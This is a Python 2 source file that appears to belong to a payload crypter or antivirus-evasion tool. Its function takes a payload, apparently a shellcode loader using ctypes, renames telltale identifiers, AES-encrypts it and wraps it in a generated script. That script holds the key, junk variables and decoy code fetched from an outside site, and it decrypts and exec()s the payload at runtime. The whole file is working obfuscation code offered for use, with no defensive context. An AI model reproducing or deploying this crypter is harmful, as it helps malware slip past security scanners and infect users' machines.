import Crypto.Cipher.AES as AES
import os
import random
import string
import requests
from HTMLParser import HTMLParser
import re

def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))

def randomJunk():
    newString = ''
    for i in xrange(random.randint(1, 10)):
        newString += ''.join(random.sample(string.ascii_lowercase, random.randint(1, 26)))
    return newString

def do_Encryption(payload):
    counter = os.urandom(16)
    key = os.urandom(32)

    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()

    randdecrypt = randomJunk()
    randshellcode = randomJunk()
    randbuf = randomJunk()
    randptr = randomJunk()
    randht = randomJunk()

    randctypes = randomJunk()
    randaes = randomJunk()

    try:
        rawHTML = HTMLParser().unescape(requests.get('http://www.4geeks.de/cgi-bin/webgen.py').text)
        randomPython = re.sub('<.*>', '', rawHTML).strip().replace('.','')
    except:
        randomPython = ''




    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode).replace('bufe', randbuf).replace('ptr', randptr).replace('ht',randht))

    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
    newpayload += randomPython
    newpayload += "\n\t%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "\t%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
    newpayload += "\t%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
    newpayload += "\t%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "\t%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
    newpayload += "\t%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))
    newpayload += "\texec(%s)" % randcipher
    print newpayload
    return newpayload
